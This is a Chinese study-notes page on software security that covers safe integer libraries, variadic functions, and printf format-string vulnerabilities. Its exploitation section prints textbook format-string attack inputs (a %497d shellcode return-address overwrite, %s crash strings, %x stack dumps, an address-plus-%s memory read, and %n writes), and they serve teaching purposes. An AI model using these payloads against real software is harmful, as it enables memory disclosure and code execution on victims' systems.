<p>（1）整数操作可能会导致溢出和数据丢失。防止整数漏洞的第一条防线就是<strong>进行范围检查：</strong>显式、隐式-通过使用强类型达。很难保证多个输入变量不被恶意用户操纵，从而导致程序中的某些操作出错。</p>
<p>（2）另一种可选的或者说是辅助的方式是将每一个操作保护起来。这属于一种劳动密集型的方式，<strong>实现起来代价很大。</strong>让输入可能被不确定来源所影响的所有整数操作都使用一个安全整数库。</p>
<p>9.无符号的加函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">in <span class="type">bool</span> <span class="title function_">UAdd</span><span class="params">(<span class="type">size_t</span> a, <span class="type">size_t</span> b, <span class="type">size_t</span> *r)</span> &#123;</span><br><span class="line"><span class="keyword">asm</span> &#123;</span><br><span class="line">mov eax, dword ptr [a] </span><br><span class="line">add eax, dword ptr [b] </span><br><span class="line">mov ecx, dword ptr [r] </span><br><span class="line">mov dword ptr [ecx], eax </span><br><span class="line">jc <span class="type">short</span> j1</span><br><span class="line">mov al, <span class="number">1</span> <span class="comment">// 1 is success</span></span><br><span class="line">jmp <span class="type">short</span> j2</span><br><span class="line">j1:</span><br><span class="line">xor al, al <span class="comment">// 0 is failure</span></span><br><span class="line">j2:</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *<span class="type">const</span> *argv)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> total;</span><br><span class="line"><span class="keyword">if</span> (UAdd(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]), <span class="number">1</span>, &amp;total) &amp;&amp;</span><br><span class="line">Uadd(total, <span class="built_in">strlen</span>(argv[<span class="number">2</span>]), &amp;total)) &#123;</span><br><span class="line"><span class="comment">// 调用函数UAdd()来计算两个字符串长度的总和时，使用了适当的错误检查机制</span></span><br><span class="line"><span class="type">char</span> *buff = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(buff, argv[<span class="number">2</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>10.SafeInt类</p>
<p>（1）<strong>在执行操作之前</strong>对操作数的值进行测试，以决定是否会导致错误。</p>
<p>由于这个类<strong>被声明为模板类</strong>，因此<strong>可以用于任何整数类型。</strong>重截了几乎每一个有关的操作符。（{}下标索引操作符除外）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *<span class="type">const</span> *argv)</span> &#123;</span><br><span class="line">try&#123;</span><br><span class="line">SafeInt&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt; <span class="title function_">s1</span><span class="params">(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]))</span>;</span><br><span class="line"><span class="comment">// 变量s1和s2分别被声明为Safelnt类型</span></span><br><span class="line">SafeInt&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt; <span class="title function_">s2</span><span class="params">(<span class="built_in">strlen</span>(argv[<span class="number">2</span>]))</span>;</span><br><span class="line"><span class="type">char</span> *buff = (<span class="type">char</span> *) <span class="built_in">malloc</span>(s1 + s2 + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(buff, argv[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line">catch(SafeIntException err) &#123;</span><br><span class="line"><span class="comment">// 调用+操作符时，使用的是Safelnt类提供的安全版本的＋操作符。这个安全版本的操作符保证，倘若结果无效则抛出一个异常</span></span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（2）整数安全解决方案对比：与Howard方法相比，Safelnt库有好几个优点。</p>
<p>①比依赖于汇编语言指令实现务全算术操作的Howard方法移植性更好</p>
<p>②<strong>更好的可用性</strong>：算术操作符可以用于常规的内联表达式、Safelnt使用C++异常处理机制代替C风格的返回代码检查。</p>
<p>③<strong>更好的性能表现</strong>(对于启用优化编译选项的应用程序而言)</p>
<p>12.整数安全库使用</p>
<p>（1）什么时候使用：<strong>让输入可能被不确定来源所影响的所有整数操作都使用一个安全整数，</strong>比如结构大小、分配的结构的个数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">CreateStructs</span><span class="params">(<span class="type">int</span> StructSize, <span class="type">int</span> HowMany)</span> &#123;</span><br><span class="line"><span class="comment">// 函数有两个参数，一个指定了给定结构的大小，一个指定了由非可信来源所能操纵的、应分配的结构的个数．这两个值的乘积决定了所分配的内存大小</span></span><br><span class="line">SafeInt&lt;<span class="type">unsigned</span> <span class="type">long</span>&gt; <span class="title function_">s</span><span class="params">(StructSize)</span>;</span><br><span class="line">s *= HowMany; <span class="comment">// 乘法操作很容易引起整型变量的溢出，同时也为缓冲区溢出提供了机会</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">malloc</span>(s.Value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（2）什么时候不使用：不需要使用安全整数进行操作。<strong>被紧密控制的循环、变量不受外部影响。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> a[INT_MAX];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; INT_MAX; i++)</span><br><span class="line">a[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<aside>
📔

<p><strong>总结</strong></p>
<p>（1）整数漏洞<strong>自数据丢失或者错误的表示</strong>所产生。当整数操作产生了一个<strong>超过其特定整型范围的值</strong>的时候，就会发生<strong>整数溢出</strong>。当一个值<strong>存储在一个太小的类型</strong>里，以至于<strong>无法表示其结果</strong>的时候，就会发生<strong>截断</strong>。标志错误源于<strong>符号位的误解，但不会导致数据的丢失。</strong></p>
<p>（2）防止这些整数漏洞发生的关键在于理解数字系统中<strong>这些整数行为的细微差异。限制整数的输入</strong>使其处于一个有效的范围内，可以阻止那些可能引起整数类型溢出的非常大或非常小的数掘进入系统。很多整数输入<strong>都定义有明确的范围</strong>，其他的整数则拥有一个<strong>合理的上下限</strong>。</p>
<p>（3）确保对整数的操作不会造成整数错误需要周详的考虑。一如既往地利用现有的工具、过程和技术来发现和防止整数漏洞是非常有意义的。<strong>静态分析和代码审核对于发现错误非常有效，源代码审核</strong>还为开发者提供了一种论坛，用来讨论什么会、什么不会造成安全缺陷，并考虑可能的解决方案。</p>
<p>（4）<strong>动态分析工具与测试相结合</strong>使用，可以用作<strong>质量保证过程</strong>的一部分，尤其是当边界条件可被正确地评估出来的时候。如果正确地应用了<strong>整数类型范围检查</strong>，并且对<strong>某些可能超出范围的值</strong>（尤其是因为来自外部的操作）采用<strong>安全整数操作</strong>，完全有可能<strong>避免由整数范围错误所导致的漏洞。</strong></p>
</aside>

<h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a><strong>格式化输出</strong></h2><h3 id="格式化输出相关知识"><a href="#格式化输出相关知识" class="headerlink" title="格式化输出相关知识"></a>格式化输出相关知识</h3><p>格式化输出的简介</p>
<p>（1）格式化输出函数参数<strong>由一个格式字符串和可变数目的参数</strong>构成</p>
<p>①格式化字符串提供了一组可以<strong>由格式化输出函数解释执行的指令</strong></p>
<p>②用户可以通过<strong>控制格式字符串的内容来控制格式化输出函数的执行</strong></p>
<p>（2）变参函数在C语言中实现的局限性导致格式化输出函数的<strong>使用中容易产生漏洞。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> *pname)</span> &#123; </span><br><span class="line"><span class="comment">// pname的运行时值将替换格式字符串中的%d从而构造用法usage字符串</span></span><br><span class="line"><span class="type">char</span> usageStr[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">snprintf</span>(usageStr, <span class="number">1024</span>,<span class="string">&quot;Usage: %s &lt;target&gt;\n&quot;</span>,pname); </span><br><span class="line"><span class="comment">// 调用printf()函数输出usage信息</span></span><br><span class="line"><span class="built_in">printf</span>(usageStr); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">usage(argv[<span class="number">0</span>]); </span><br><span class="line"><span class="comment">// 程序的实际名字由用户输入（argv[0]）并作为参数传递给usage()函数</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>); &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="变参函数"><a href="#变参函数" class="headerlink" title="变参函数"></a>变参函数</h3><p>1.ANSI C标准参数</p>
<p>（1）在ANSI C的标准参数方式（也称为stdargs）中，变参函数是通过使用<strong>一个部分参数列表后跟一个省略号进行声明的。</strong>若要调用一个变参函数，仅需指定该次调用中所需数目的参数即可：average(3,5,8,-1);</p>
<p>（2）使用stdargs实现average()函数</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">average</span><span class="params">(<span class="type">int</span> first, ...)</span> &#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>, sum = <span class="number">0</span>, i = first;</span><br><span class="line">va_list marker;</span><br><span class="line">va_start(marker, first); </span><br><span class="line"><span class="keyword">while</span> (i != <span class="number">-1</span>) &#123;</span><br><span class="line">sum += i;</span><br><span class="line">count++;</span><br><span class="line">i = va_arg(marker, <span class="type">int</span>);</span><br><span class="line">&#125;</span><br><span class="line">va_end(marker); </span><br><span class="line"><span class="keyword">return</span>(sum ? (sum / count) : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）变参函数<strong>average()接受一个独立的定参，其后跟着一个变参列表</strong>。对该变参列表中的参数不会执行任何类型检查。省略号之前通常有一个或多个定参，而省略号则必须出现在参数列表的最后。</p>
<p>（4）ANSI C为了实现变参函数所提供的宏，va_start(), va_arg()和va_end()的定义。这些定义在头文件stdarg.h中的宏，全部作用于va_list数据类型以及使用va_list类型声明的参数列表之上。</p>
<p>2.可变参数宏定义示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _ADDRESSOF(v) (&amp;(v))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _INTSIZEOF(n) \</span></span><br><span class="line"><span class="meta">((sizeof(n)+sizeof(int)-1) &amp; ~(sizeof(int)-1))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> *va_list; <span class="comment">// 变量maker被声明为va_list类型</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_start(ap,v) </span></span><br><span class="line"><span class="comment">// 在使用变量marker之前，首先必须调用va_start()对它进行初始化</span></span><br><span class="line"><span class="comment">// 调用了va_start()并且传递参数marker以及最后一个定参（first）</span></span><br><span class="line">(ap=(va_list)_ADDRESSOF(v)+_INTSIZEOF(v))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_arg(ap,t) (*(t *)((ap+=_INTSIZEOF(t))-_INTSIZEOF(t)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> va_end(ap) (ap = (va_list)0)</span></span><br></pre></td></tr></table></figure>

<p>（1）宏va_arg()需要一个<strong>已初始化的va_list</strong>和<strong>下一个参数的类型</strong>。这个宏可以根据这些信息返回下一个参数的值，并且相应地递增参数指针。</p>
<p>（2）average()第8行调用va_arg()宏，通过循环，获取第2个直至最后一个参数。最后，在函数返回之前，调用va_end()来执行清理工作。</p>
<p>（3）参数列表的终止条件是函数的实现者和使用者之间的一个契约。在函数average()的实现中，变参列表的终止是由一个值为-1的参数所指定的。</p>
<p>（4）如果程序员在调用该函数时忘记传入这个特殊的参数，则函数将继续处理下一个参数，直到遇到-1或者发生异常为止。</p>
<p>3.采用字符指针定义的va_list类型</p>
<p>（1）（练习题代码）在这些系统中调用函数average(3,5,8,-1)时，参数被如何按序安排在栈上。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2080.png" alt="image.png"></p>
<p>（2）在用va_start()初始化字符指针后，字符指针指向<strong>最后一个定参之后的那个参数</strong>。va_start()宏将该参数的（类型）大小加上最后一个定参的地址。当va_start()返回时，va_list将指向<strong>第一个可选参数的地址。</strong></p>
<p>（3）并不是所有系统都把va_list类型定义成字符指针。一些系统将其定义成<strong>指针数组</strong>，另外一些系统则把它<strong>放在寄存器中作为参数传递</strong>。当参数在寄存器中传递时，va_start()可能不得不为它们分配内存空间。宏va_end()就被<strong>用来释放分配的内存空间。</strong></p>
<p>7.使用varargs实现的average()函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">average</span><span class="params">(va_alist)</span> va_dcl &#123;</span><br><span class="line"><span class="type">int</span> i, count, sum;</span><br><span class="line">va_list marker;</span><br><span class="line"><span class="comment">// Unix System V的宏（定义于varargs.h中）的运作方式稍微不同于ANSI标准参数</span></span><br><span class="line">va_start(marker); </span><br><span class="line"><span class="keyword">for</span> (sum = count = <span class="number">0</span>; </span><br><span class="line">(i = va_arg(marker, <span class="type">int</span>)) != <span class="number">-1</span>; count++)</span><br><span class="line">sum += i;</span><br><span class="line">va_end(marker); </span><br><span class="line"><span class="keyword">return</span>(sum ? (sum / count) : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="格式化输出函数"><a href="#格式化输出函数" class="headerlink" title="格式化输出函数"></a>格式化输出函数</h3><p>1.格式化输出函数</p>
<p>（1）fprintf()按照<strong>格式字符串的内容将输出写入流中</strong>。<strong>流、格式字符串和变参列表</strong>一起作为参数提供给函数。</p>
<p>（2）printf()等同于fprintf()，除了前者假定<strong>输出流为stdout外。</strong></p>
<p>（3）sprintf()等同于fprintf()，但是<strong>输出不是写入流而是写入数组中</strong>。</p>
<p>（4）snprintf()等同于sprintf()，但是它指定了<strong>可写入字符的最大值n。超出部分会被舍弃，并且字符末尾会加上空字符。</strong></p>
<p>（5）这些函数受到格式化字符串限制。<strong>当参数过多时，直接省略</strong>；参数过少时，结果未定义（会访问栈中原内容当作参数）。</p>
<p>2.相同的函数：vfprintf()、fprintf()；vprintf()、printf()；vsprintf()、sprintf()；vsnprintf()、snprintf()。当参数列表是在运行时决定时，这些函数非常有用。</p>
<p>3.格式字符串</p>
<p>（1）格式字符串是<strong>由普通字符（包括%）和转换规范构成的</strong>字符序列。</p>
<p>（2）普通字符<strong>被原封不动地复制到输出流中。</strong></p>
<p>（3）转换规范根据与实参对应的<strong>转换指示符</strong>对其进行转换，然后将结果写入输出流中。</p>
<p>（4）转换规范通常<strong>以%开始</strong>按照<strong>从左向右</strong>的顺序解释。</p>
<p>（5）当<strong>参数过多</strong>时，<strong>多余的将被忽略。</strong>而当<strong>参数不足</strong>时，则<strong>结果是未定义的。</strong></p>
<p>（6）一个转换规范组成：</p>
<p><strong>可选域：</strong>标志、宽度、精度以及长度修饰符</p>
<p><strong>必需域：</strong>转换指示符，按照下面的格式</p>
<p>%[<em>flags</em>] [<em>width</em>] [.<em>precision</em>] [{<em>length modifier</em>}] <em>conversion-specifier.</em></p>
<p>例如%-10.8ld：-是标志位，10代表宽度，8代表精度，l是长度修饰符，d是转换指示符。这个转换规范将一个<strong>long int型的参数按照十进制格式打印</strong>，在一个<strong>最小宽度为10个字符的域中保持最少8位左对齐。</strong>最简单的转换规范仅仅包含一个%和一个转换指示符（例如%s）。</p>
<p>4.宽度</p>
<p>（1）宽度是一个用来<strong>指定输出字符的最小个数的十进制非负整数。如果输出的字符个数比指定的宽度小，就用空白字符补足。</strong></p>
<p>（2）如果指定的宽度较小<strong>也不会引起输出域的截断</strong>。如果转换的结果比域宽大，则<strong>域会被扩展以容纳转换结果。</strong></p>
<p>（3）如果使用星号（<em>）来指定宽度，则宽度将<strong>由参数列表中的一个int型的值</strong>提供。在参数列表中，宽度参数必须置于*<em>被格式化的值之前。</em></em></p>
<p>5.精度</p>
<p>（1）精度是用来指示打印字符个数、小数位数或者有效数字个数的非负十进制整数。</p>
<p>（2）精度域可能<strong>会引起输出的截断或浮点值的舍入。</strong></p>
<p>（3）如果精度域是一个星号<strong>（*）</strong>，那么它的值就由参数列表中的一个int参数提供。</p>
<p>（4）在参数列表中，精度参数<strong>必须置于被格式化的值之前。</strong></p>
<h3 id="对格式化输出函数的漏洞利用"><a href="#对格式化输出函数的漏洞利用" class="headerlink" title="对格式化输出函数的漏洞利用"></a>对格式化输出函数的漏洞利用</h3><p>当使用的格式字符串（或部分字符串）是<strong>由用户或其他非信任来源提供的时候</strong>，就有可能出现格式字符串漏洞。当格式化输出例程对一个数据结构进行越界写时就可能会导致缓冲区溢出。</p>
<p>1.缓冲区溢出：向字符数组中<strong>写入数据的格式化输出函数</strong>，<strong>会假定存在任意长度的缓冲区</strong>，从而导致它们易于造成缓冲区溢出。</p>
<p>考试练习题：</p>
<p>缓冲区溢出漏洞，发生于将%s替换成用户提供的字符串user（可能是恶意数据）时。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;Wrong command: %s\n&quot;</span>, user)</span><br></pre></td></tr></table></figure>

<p>因使用sprintf()所导致的缓冲区溢出漏洞，该漏洞发生于将转换指示符%s替换成用户提供的字符串。任何长度大于<strong>495字节</strong>的字符串都会导致越界写<strong>（512字节-16个字符字节-1个空字节）。</strong></p>
<p>2.可伸展的缓冲区</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> outbuf[<span class="number">512</span>];</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(buffer,<span class="string">&quot;ERR Wrong command: %.400s&quot;</span>,user);</span><br><span class="line"><span class="built_in">sprintf</span>(outbuf, buffer); <span class="comment">// 栈溢出，控制权转移给shellcode</span></span><br></pre></td></tr></table></figure>

<ul>
<li>sprintf(buffer,”ERR Wrong command: %.400s”,user)：sprintf()调用并不会被直接利用，因为转换指示符%.400s限制了仅能写入400字节。</li>
<li>sprintf(outbuf, buffer)：同样的调用可被用于间接地攻击第4行中的sprintf()调用。例如用户通过使用下述值：%497d\x3c\xd3\xff\xbf<nops><shellcode>，在第3行调用的sprintf()直接将该字符串插入缓冲区。然后这个缓冲区数组将被作为格式字符串参数传递给在<strong>第4行</strong>被第二次调用的sprintf()。</li>
</ul>
<p>（1）格式规范**%497d**指示函数sprintf()<strong>从栈中读出一个假的参数并向缓冲区中写入497个字符。</strong></p>
<p>（2）包括格式字符串中的普通字符在内，现在写入的字符总数<strong>已经超过了outbuf的长度4个字节。</strong></p>
<p>（3）用户输入可被操纵用于<strong>覆写返回地址</strong>，也就是<strong>拿恶意格式</strong>字符串参数中提供的利用代码的地址<strong>（0xbfffd33c）去覆盖该地址。</strong></p>
<p>（4）在当前函数退出时，控制权将以与栈粉碎攻击相同的方式转移给利用代码。</p>
<p>（5）这个例子中的编程缺陷是由于在第4行不恰当地调用了sprintf()函数来实现字符串的复制功能，其实这里应该使用strcpy()或strncpy()。<strong>如果在第4行使用strcpy()来代替sprintf()，就能够消除这个漏洞。</strong></p>
<p>3.输出流：将结果输出到流而不是输出到文件中的格式化输出函数<strong>（例如printf())<strong>也可能会</strong>导致格式字符串漏洞。</strong></p>
<p>int func(char *user){printf(user);}</p>
<p>如果用户能够部分或者全部<strong>控制用户参数</strong>，那这个程序就会被利用从而导致程序崩溃、查看栈内容、查看内存内容或覆写内存。</p>
<p>4.使程序崩溃</p>
<p>（1）格式字符串漏洞通常是在<strong>程序崩溃</strong>的时候才被发现。Windows中，读取一个<strong>未映射的地址</strong>会崩溃；Unix中，存取<strong>无效指针</strong>会崩溃。</p>
<p>（2）（多次考）当用printf(“%s%s%s%s%s%s%s%s%s%s%s%s”)格式字符串调用格式化输出函数时，<strong>就会触发无效指针存取或未映射的地址读取。</strong>转换指示符**%s显示执行栈上相应参数所指定的地址的内存。<strong>由于在这个例子中没有提供字符串参数，因此</strong>printf()可以读取栈中任意内存位置，直到格式字符串耗尽或者遇到一个无效指针或未映射地址为止。**</p>
<p>5.查看栈内容：攻击者还可以利用格式化输出函数来检查内存的内容。</p>
<p>（1）反汇编printf()调用：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2081.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2082.png" alt="image.png"></p>
<p>（2）过程：</p>
<p><strong>①format字符串0xe0f84201的地址</strong>出现在内存中的位置恰好位于参数值1、2、3之前。</p>
<p>②紧邻参数之后的内存中包含有<strong>调用函数的自动变量</strong>，后者包括<strong>format字符数组0x2e253038的内容</strong>。</p>
<p>③本例中的格式字符%08x.%08x.%08x.%08指示函数printf()从栈中取回4个参数并将它们以8位十六进制数的形式显示出来。随着每一个参数被相应的格式规范所耗用，参数指针的值<strong>也根据参数的长度不断递增。</strong></p>
<p>④格式字符串中的每一个别%08x都会从参数指针指定的位置<strong>读入一个被解释为int型的值。</strong>通过每一个格式字符串输出的这些值被显示在相应格式字符串下面。第四个“整数”包含<strong>格式字符串%08x的ASCII码的前四个字节。</strong></p>
<p>（3）包括printf()在内的格式化输出函数使用一个内部变量来标志下一个参数的位置。<strong>栈的内容或栈指针并没有被修改，因此执行将按预期继续进行下去</strong>，直到控制权返回给调用程序。<strong>格式化输出函数将以这种形式持续显示内存中的其他内容，直到在格式字符串中遇到一个空字节。</strong></p>
<p>（4）在显示完当前执行函数的剩余自动变量之后，<strong>printf()将显示当前执行函数的栈帧</strong>（包括当前执行函数的返回地址和参数）。由于printf()在内存中是按顺序“移动”的，所以它将会显示调用函数的同样的信息。一个函数调用一个函数，以此类推，直至整个栈。</p>
<p>（5）使用这个技术，有可能重建大部分的栈内存。攻击者可以使用这些数据来决定程序的偏移量或其他信息，从而进一步利用该漏洞或其他漏洞。</p>
<p>6.查看内存内容</p>
<p>（1）转换指示符%s显示<strong>参数指针所指定的地址的内存</strong>，将它作为一个ASCII字符串处理，直至遇到一个空字符。如果攻击者能够通过操纵这个参数指针来<strong>引用一个特定的地址</strong>，那么转换指示符%s将会<strong>输出该位置的内存内容</strong>。参数指针可以<strong>使用转换指示符%x进行前向移动。</strong></p>
<p>（2）它所能移动的距离<strong>仅受格式字符串的大小所限制</strong>。攻击者就能够<strong>在调用函数的自动变量中插入一个地址。</strong>如果格式字符串被存储为一个自动变量，那么地址就能被插入在字符串的开始部分。攻击者可以按照下面的格式创建一个格式字符串来查看指定地址的内存：<em>address advance-argptr</em> %s</p>
<p>（3）查看某个具体位置的内存</p>
<p>考试练习题：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2083.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2084.png" alt="image.png"></p>
<ul>
<li>攻击者可以使用转换指示符%s显示参数指针所指定的地址的内存，将它作为一个ASCII字符串处理，直至遇到一个空字符。参数指针可以使用转换指示符%x进行前向移动，它所能移动的距离仅受<strong>格式字符串的大小所限制。</strong></li>
<li>当攻击者提供的格式字符串为\xdc\xf5\x42\x01%x%x%x%s，printf()将显示<strong>从0x0142f5dc开始的内存直到遇到字节\0结束。</strong>3个转换指示符%x应该使参数指针从格式字符串的开始位置<strong>前进12个字节。</strong></li>
<li>这个内存空间可以通过对函数printf()的调用之间的地址步进而被映射。查看任意地址的内存的能力有助于攻击者开发其他更具破坏性的利用，在受害计算机上执行任意的代码就是一个例子。</li>
</ul>
<p>7.覆写内存</p>
<p>（1）格式化输出函数之所以具有特别的危险性是因为<strong>大多数程序员还没有意识到其破坏力。</strong>在那些<strong>整型值和地址</strong>具有同样大小平台上，<strong>向任意地址写入整型值的能力</strong>可被用于在受害系统上执行任意的代码。最初转换指示符**%n<strong>是用来帮助</strong>排列格式化输出字符串<strong>的。它将</strong>字符数目成功地输出到以参数的形式提供的整数地址中。**</p>
<p>（2）例如，在执行下面的代码片断后：int i;printf(“hello%n\n”, (int *)&amp;i);变量i被赋值为5，因为在遇到转换指示符%n之前<strong>一共写入了5个字符（hello）</strong>。通过使用转换指示符%n ，攻击者可以<strong>向指定地址中写入一个整数值。</strong>为了利用这个安缺陷，攻击者需要向任意一个地址中写入－个任意值。</p>
